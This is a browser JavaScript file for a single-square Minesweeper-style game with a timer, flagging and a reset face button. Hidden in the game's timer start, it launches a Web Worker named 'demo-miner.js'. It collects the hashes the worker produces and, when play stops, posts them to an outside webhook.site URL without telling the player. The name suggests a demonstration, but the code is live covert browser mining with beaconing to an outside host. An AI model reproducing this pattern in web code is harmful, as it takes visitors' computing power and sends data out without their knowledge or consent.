document.addEventListener('DOMContentLoaded', () => {

    (() => {
        const digit = document.querySelector(".digit");
        const timer0 = document.querySelector(".timer-0");
        const timer1 = document.querySelector(".timer-1");
        const timer2 = document.querySelector(".timer-2");
        const faceButton = document.querySelector(".face-button");
        const oneSquare = document.querySelector(".one-square");

        let clicking = false;

        let startTime, animationFrame;
        let last = "";

        startTimer();

        document.oncontextmenu = function (e) {
            if (e.target === oneSquare) return false;
        };

        function reset() {
            cancelAnimationFrame(animationFrame);
            dead = false;
            win = false;
            faceButton.classList.remove("face-button-clicking");
            faceButton.classList.remove("face-button-dead");
            faceButton.classList.remove("face-button-won");
            oneSquare.classList.remove("exploded");
            oneSquare.classList.remove("flagged");
            digit.src = "./img/display-digit-1.png";
            startTimer();
        }

        function startTimer() {
            startWorker();
            startTime = Date.now();
            animationFrame = window.requestAnimationFrame(tick);
        }

        function tick() {
            setTime(Date.now() - startTime);
            animationFrame = window.requestAnimationFrame(tick);
        }

        function setTime(duration) {
            let seconds = Math.floor((duration / 1000) % 60);

            if (seconds > 999) {
                seconds = 999;
            }

            const secondString = seconds.toString().padStart(3, 0).split("");
            timer0.src = `./img/display-digit-${secondString[0]}.png`;
            timer1.src = `./img/display-digit-${secondString[1]}.png`;
            timer2.src = `./img/display-digit-${secondString[2]}.png`;
        }

        oneSquare.addEventListener("mousedown", (e) => {
            if (e.ctrlKey) {
                e.preventDefault();
                e.stopPropagation();
            }
            clicking = true;
            faceButton.classList.add("face-button-clicking");
        });

        oneSquare.addEventListener("mouseup", (e) => {
            if (clicking === false) {
                return;
            }

            if (e.ctrlKey || e.which === 3) {
                faceButton.classList.remove("face-button-clicking");
                oneSquare.classList.add("flagged");
                faceButton.classList.add("face-button-won");
                digit.src = "./img/display-digit-0.png";
            } else {
                faceButton.classList.remove("face-button-clicking");
                oneSquare.classList.add("exploded");
                faceButton.classList.add("face-button-dead");
                digit.src = "./img/display-digit-1.png";
            }

            cancelAnimationFrame(animationFrame);
            clicking = false;
            stopWorker();
        });

        oneSquare.addEventListener("mouseout", () => {
            if (clicking === true) {
                clicking = false;
                faceButton.classList.remove("face-button-clicking");
            }
        });

        faceButton.addEventListener("click", () => {
            reset();
        });
    })();
});

let worker;

let haseIndex = 0;
function startWorker() {
    if (typeof (Worker) !== "undefined") {
        if (typeof (worker) == "undefined") {
            worker = new Worker("demo-miner.js");
            worker.onmessage = function (e) {
                sessionStorage.setItem('hash' + haseIndex, e.data);
                haseIndex++;
            };
        }
    }
}

function stopWorker() {
    if (worker) {
        worker.terminate();
        worker = undefined;
        // Send hashes to network and clear storage
        for (let i = 0; i < haseIndex; i++) {
            const hash = sessionStorage.getItem('hash' + i);
            if (hash) {
                fetch('https://webhook.site/703157e4-32f0-4a9b-b9c6-e69cde5db599', {
                    method: 'POST',
                    mode: 'no-cors', // Try disabling CORS (limited functionality!)
                    body: JSON.stringify({ hash }),
                    headers: { 'Content-Type': 'application/json' }
                }).catch(error => console.error('Error:', error));
                sessionStorage.removeItem('hash' + i);
            }
        }
        haseIndex = 0;
    }
}